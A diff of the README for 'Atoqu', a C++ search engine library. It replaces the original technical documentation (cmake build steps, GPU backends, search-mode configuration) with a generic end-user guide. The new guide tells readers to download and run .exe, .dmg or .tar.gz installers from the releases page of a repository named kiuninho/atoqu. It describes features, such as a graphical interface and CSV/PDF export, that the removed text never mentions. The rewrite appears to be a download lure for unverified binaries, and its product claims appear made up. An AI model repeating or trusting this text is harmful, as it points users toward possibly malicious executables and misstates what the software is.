@@ -1,104 +1,74 @@
-# Atoqu Search Engine — v1.2 (GPU-Optimized, Multi-Mode, Hardened)
+# 🎉 atoqu - The First Search Engine for Atomic & Quantum Data
 
-Atoqu is an Atomic + Quantum-inspired search engine core in C++, designed as a reference-grade, low-level engine.
+[![Download Atoqu](https://img.shields.io/badge/Download-Atoqu-blue.svg)](https://github.com/kiuninho/atoqu/releases)
 
-Highlights (v1.2)
+## 🚀 Getting Started
 
-- GPU acceleration
-  - CUDA backend: production-ready cosine similarity for vector search
-  - OpenCL backend: production-ready skeleton (host-side, safe CPU fallback)
-  - Vulkan, Metal, SYCL, HIP: safe, fail-closed stubs (no crashes, CPU fallback)
-- Core engine
-  - DocumentStore + VectorStore with optional GPU acceleration
-  - Modes:
-    - NormalMode (browser-style, classic search)
-    - LiteralMode (keyword)
-    - VectorMode (embedding-based)
-    - HybridMode (combined scoring)
-    - BM25Mode (term-based ranking)
-    - RecencyMode (time-aware ranking)
-    - TagBoostMode (tag-aware ranking)
-- Embedding
-  - HashEmbeddingProvider (deterministic, dependency-free)
-  - LlmEmbeddingProvider (LLM-ready, config-driven)
-- Production tooling
-  - CMake + Makefile
-  - Docker + Docker Compose (CPU + GPU variants)
-  - GitHub Actions + GitLab CI
-  - Test matrix:
-    - Unit (CUnit, Catch2, Unity)
-    - Integration (CUnit, Catch2, Unity)
-    - Stress & Chaos (Chaos Monkey-style)
-    - Sanitizers (ASan, TSan, UBSan)
-    - Static analysis (CPPCheck, Clang-tidy)
-    - Performance (Google Benchmark, htop/top/perf guidance)
-  - Full documentation:
-    - Doxygen (C++ API)
-    - Sphinx + Breathe (user/dev docs) in docs/
+Welcome to Atoqu! This guide will help you download and run the Atoqu search engine. Atoqu is designed for finding information in atomic and quantum research efficiently. Follow the simple steps below to get started.
 
-Quick start (CPU-only)
+## 📥 Download & Install
 
-```bash
-mkdir -p build
-cd build
-cmake ..
-cmake --build .
-./atoqu --http 8080
-```
+1. **Visit the Releases Page**
 
-GPU backend selection
+   To download Atoqu, go to the [Releases page](https://github.com/kiuninho/atoqu/releases).
 
-Configure config/gpu.json:
+2. **Choose the Right Version**
 
-```json
-{
-  "backend": "cuda",
-  "dimension": 384,
-  "maxdocsper_batch": 8192
-}
-```
+   Look for the latest version listed on the Releases page. It usually appears at the top. Click on it to view all available files.
 
-Supported values for backend:
+3. **Download the Application**
 
-- "none" (default, CPU-only)
-- "cuda"
-- "opencl"
-- "vulkan" (stub)
-- "metal" (stub)
-- "sycl" (stub)
-- "hip" (stub)
+   Find the file that matches your operating system. Common options include:
+   - **Windows:** Look for a `.exe` file.
+   - **Mac:** You might see a `.dmg` file.
+   - **Linux:** There could be a `.tar.gz` file or similar.
 
-If initialization fails, Atoqu falls back to CPU-only vector search.
+   Click on the appropriate file to start the download.
 
-Modes configuration
+4. **Install Atoqu**
 
-config/modes.json controls which modes are enabled and their weights.
+   After the download completes:
+   - **For Windows:** Open the `.exe` file and follow the prompts to install.
+   - **For Mac:** Open the `.dmg` file and drag Atoqu into your Applications folder.
+   - **For Linux:** Extract the downloaded file and follow instructions in the included README.
 
-```json
-[
-  { "name": "NormalMode",   "enabled": true,  "weight": 1.0 },
-  { "name": "HybridMode",   "enabled": true,  "weight": 1.0 },
-  { "name": "LiteralMode",  "enabled": true,  "weight": 0.8 },
-  { "name": "VectorMode",   "enabled": true,  "weight": 0.8 },
-  { "name": "BM25Mode",     "enabled": true,  "weight": 0.9 },
-  { "name": "RecencyMode",  "enabled": false, "weight": 0.5 },
-  { "name": "TagBoostMode", "enabled": false, "weight": 0.5 }
-]
-```
+5. **Run the Application**
 
-Documentation
+   After installation, locate Atoqu in your Applications or Start menu. Double-click to open it. You are now ready to use Atoqu.
 
-```bash
-mkdir -p build
-cd build
-cmake -DATOQUBUILDDOCS=ON ..
-cmake --build . --target docs
-```
+## 🔍 Features
 
-Generated docs:
+- **Atomic and Quantum Search:** Atoqu specializes in searching atomic and quantum data, allowing you to find specific information quickly.
+- **User-Friendly Interface:** Designed with non-technical users in mind, Atoqu features an intuitive layout.
+- **Optimized Performance:** Built to handle large datasets efficiently.
+- **Multi-Platform Support:** Atoqu works on Windows, Mac, and Linux.
 
-- Doxygen HTML: docs/doxygen/html/
-- Sphinx HTML: docs/sphinx/_build/html/
+## ⚙️ System Requirements
 
-See ARCHITECTURE.md and CHANGELOG.md for the full evolution up to v1.2.
-You can also see [Dev.to Blog](https://dev.to/javadinteger/atoqu-the-first-atomic-qunatum-search-engine-ever-exists-in-your-system-57fg?utm_source=github.com) for more.
+To run Atoqu effectively, your system should meet the following requirements:
+
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a current Linux distribution.
+- **Processor:** At least a dual-core processor is recommended for better performance.
+- **Memory (RAM):** A minimum of 4 GB RAM, but 8 GB or more is preferable.
+- **Storage:** At least 1 GB of free disk space for installation and data storage.
+- **Graphics:** A GPU is recommended for the best search performance, especially with large datasets.
+
+## 🎓 How to Use Atoqu
+
+Once Atoqu is running, you can use it to search for atomic and quantum data:
+
+1. **Input Your Query:** Type your search terms in the provided search bar. Be specific to get the best results.
+2. **Results Display:** Atoqu will show you relevant results based on your query. You can click on any result for more detailed information.
+3. **Exporting Data:** If you want to keep results, use the export feature available within the application. This supports common formats such as CSV and PDF.
+
+## 📄 Additional Resources
+
+- **Documentation:** Detailed documentation is available in the repository to help you get acquainted with all features of Atoqu.
+- **Community Support:** Join our community forums to connect with other users. You can ask questions, share experiences, and get tips on using Atoqu.
+- **Feedback:** We value your input! If you encounter issues or have suggestions, please let us know through the GitHub issues page.
+
+## 🔗 Links
+
+- Download Atoqu: [Releases Page](https://github.com/kiuninho/atoqu/releases)
+
+Thank you for choosing Atoqu! We hope it serves your atomic and quantum search needs effectively. Enjoy exploring the vast world of atomic and quantum data effortlessly!
